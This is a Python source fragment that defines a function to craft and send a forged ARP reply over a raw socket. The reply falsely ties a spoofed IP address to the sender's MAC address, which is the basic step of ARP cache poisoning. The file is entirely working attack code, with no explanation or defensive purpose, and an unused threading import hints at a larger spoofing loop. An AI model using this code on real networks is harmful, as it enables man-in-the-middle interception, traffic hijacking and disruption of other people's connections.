import socket
import struct
import threading



def send_arp_packet(interface, target_ip, spoof_ip, your_mac):
    try:
        # Create a raw socket to send ARP packets
        raw_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))

        # Bind the socket to the specified network interface
        raw_socket.bind((interface, 0))

        # Set the MAC address in binary format
        mac = bytes.fromhex(your_mac.replace(":", "")) 

        # Construct the Ethernet frame header
        eth_header = struct.pack('!6s6sH', b'\xFF\xFF\xFF\xFF\xFF\xFF', mac, 0x0806)

        # Construct the ARP payload
        arp_payload = struct.pack('2s2s1s1s2s6s4s6s4s',
                                b'\x00\x01',   # Hardware type (Ethernet)
                                b'\x08\x00',   # Protocol type (IPv4)
                                b'\x06',       # Hardware address length
                                b'\x04',       # Protocol address length
                                b'\x00\x02',   # ARP operation (2 for reply)
                                mac,           # Sender MAC address
                                socket.inet_aton(spoof_ip),  # Sender IP address
                                mac,           # Target MAC address
                                socket.inet_aton(target_ip)  # Target IP address
                                )
        packet = eth_header + arp_payload  # Combine Ethernet frame header and ARP payload
        # print("ARP Packet:")
        # arp = struct.unpack('2s2s1s1s2s6s4s6s4s', arp_payload)
        # print('\t - Hardware Type: {}, Protocol Type: {}'.format(arp[0], arp[1]))
        # print('\t - Hardware Size: {}, Protocol Size: {}'.format(arp[2], arp[3]))
        # print('\t - Operation: {}'.format(arp[4]))
        # print('\t - Sender MAC: {}, Sender IP: {}'.format(arp[5], arp[6]))
        # print('\t - Target MAC: {}, Target IP: {}'.format(arp[7], arp[8]))
        # Send the ARP packet
        raw_socket.send(packet)

        # Close the socket
        raw_socket.close()
    except Exception as e:
        print(f"An error occurred: {e}")


